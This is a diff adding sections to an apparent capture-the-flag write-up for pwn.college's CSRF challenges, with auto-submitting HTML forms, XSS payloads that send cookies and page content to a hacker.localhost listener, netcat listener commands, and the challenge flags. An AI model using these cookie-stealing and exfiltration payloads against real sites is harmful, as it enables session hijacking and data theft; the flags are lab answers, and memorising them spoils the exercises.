@@ -1576,3 +1576,121 @@ We insert the cookie and get the admin session:
 ![](fig/xss7_admin_session.png)
 
 Flag: `pwn.college{IfVyqL8XKGwK7AM8CT-696xmGny.QXygTN2wyMyITOyEzW}`
+
+## CSRF 1
+
+![](fig/csrf1.png)
+
+Our CSRF page:
+
+```html
+<html>
+<form action="http://challenge.localhost/publish" method="GET">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</html>
+```
+
+> Note: other methods like JavaScript's `fetch` or `<img src="">` do not work. The cookies aren't sent.
+
+Flag: `pwn.college{MHL2EuaEjFanDqVvAovgmmu2PgK.QX3kzMzwyMyITOyEzW}`
+
+## CSRF 2
+
+![](fig/csrf2.png)
+
+Just change the `form` method to `POST` in our CSRF page:
+
+```html
+<html>
+<form action="http://challenge.localhost/publish" method="POST">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</html>
+```
+
+Flag: `pwn.college{0h5DRRlgJ3P29z8NbtOzxMr8i5i.QX4kzMzwyMyITOyEzW}`
+
+## CSRF 3
+
+Here we send the URL GET parameter `msg` with the XSS payload as an `input` inside the `form`.
+
+![](fig/csrf3.png)
+
+```html
+<html>
+<form action="http://challenge.localhost/ephemeral" method="GET">
+<input type="hidden" name="msg" value='<script>alert("PWNED")</script>'/>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</html>
+```
+
+Flag: `pwn.college{ECdsVVwloTQWTDZaXSZjiKpoxjI.QXzgTN2wyMyITOyEzW}`
+
+## CSRF 4
+
+Here we exploit the XSS through a CSRF page that makes a request to steal cookies.
+
+```html
+<html>
+<form action="http://challenge.localhost/ephemeral" method="GET">
+<input type="hidden" name="msg" value='<script>fetch(`http://hacker.localhost:1337/${btoa(document.cookie)}`)</script>'/>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</html>
+```
+
+![](fig/csrf4.png)
+
+We get the base64 encoded cookie `YXV0aD1hZG1pbnwuUVg1a3pNend5TXlJVE95RXpXfQ==`.
+
+```
+hacker@web-security~csrf-4:~$ echo -n "YXV0aD1hZG1pbnwuUVg1a3pNend5TXlJVE95RXpXfQ==" | base64 -d
+auth=admin|.QX5kzMzwyMyITOyEzW}
+```
+
+Then we put the admin cookies to log in.
+
+![](fig/csrf4_admin_cookie.png)
+
+Flag: `pwn.college{4jCEJVQiluoyA4QPKW-KoskPPOH.QX5kzMzwyMyITOyEzW}`
+
+## CSRF 5
+
+Here we `fetch` the posts page content (raw HTML) and send it base64 encoded to our `nc -lvnp 1338` listener.
+
+Observe that we send the data as the body of a `POST` request.
+
+```html
+<html>
+<form action="http://challenge.localhost/ephemeral" method="GET">
+<input type="hidden" name="msg" value='<script>fetch("http://challenge.localhost/").then(r => r.text()).then(content => { fetch("http://hacker.localhost:1338", {method:"POST",body:btoa(content)}); })</script>'/>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</html>
+```
+
+We set up `python -m http.server 1337` and `nc -lvnp 1338`.
+
+![](fig/csrf5_run.png)
+
+Executing `/challenge/victim`, we receive the base64 encoded raw HTML.
+
+![](fig/csrf5_nc.png)
+
+Finally, we decode it.
+
+![](fig/csrf5_loot.png)
+
+Flag: `pwn.college{0K-bLHVWpV-3sxCbRQvaxGQdTCw.QXwADNzwyMyITOyEzW}`
